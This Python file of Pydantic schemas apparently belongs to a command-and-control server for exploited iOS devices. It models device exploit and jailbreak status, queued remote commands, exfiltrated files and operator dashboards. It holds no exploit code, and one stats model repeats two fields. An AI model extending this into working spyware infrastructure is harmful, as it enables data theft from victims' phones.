from pydantic import BaseModel
from datetime import datetime
from typing import Optional, List

class Token(BaseModel):
    access_token: str
    token_type: str

class TokenData(BaseModel):
    username: Optional[str] = None

class UserCreate(BaseModel):
    username: str
    password: str
    role: str = "operator"

class UserUpdate(BaseModel):
    username: Optional[str] = None
    password: Optional[str] = None
    role: Optional[str] = None

class UserResponse(BaseModel):
    id: int
    username: str
    role: str
    created_at: datetime
    last_login: Optional[datetime] = None

class LogResponse(BaseModel):
    id: int
    timestamp: datetime
    ip: str
    method: Optional[str] = None
    path: Optional[str] = None
    status_code: Optional[int] = None
    content_length: Optional[int] = None
    user_agent: Optional[str] = None
    log_type: str
    device_uuid: Optional[str] = None

class LogFilter(BaseModel):
    ip: Optional[str] = None
    path: Optional[str] = None
    log_type: Optional[str] = None
    start_time: Optional[datetime] = None
    end_time: Optional[datetime] = None

class DeviceResponse(BaseModel):
    id: int
    device_uuid: str
    first_seen: datetime
    last_seen: datetime
    ip: str
    user_agent: Optional[str] = None
    status: str
    os_version: Optional[str] = None
    device_model: Optional[str] = None
    chipset: Optional[str] = None
    jailbroken: Optional[str] = None
    exploit_status: Optional[str] = None
    last_command_time: Optional[datetime] = None

class DeviceUpdate(BaseModel):
    os_version: Optional[str] = None
    device_model: Optional[str] = None
    chipset: Optional[str] = None
    jailbroken: Optional[str] = None
    exploit_status: Optional[str] = None

class ExfilDataResponse(BaseModel):
    id: int
    device_uuid: str
    category: str
    path: str
    description: Optional[str] = None
    file_path: str
    file_size: int
    uploaded_at: datetime

class CommandResponse(BaseModel):
    id: int
    device_uuid: str
    command: str
    status: str
    output: Optional[str] = None
    created_at: datetime
    executed_at: Optional[datetime] = None

class CommandCreate(BaseModel):
    command: str

class StatsResponse(BaseModel):
    total_requests: int
    total_devices: int
    total_exfil: int
    active_devices: int
    ios_logs: int
    pending_commands: int
    today_requests: int
    today_exfil: int
    request_trend: List[int]
    exfil_trend: List[int]
    active_devices: int
    pending_commands: int
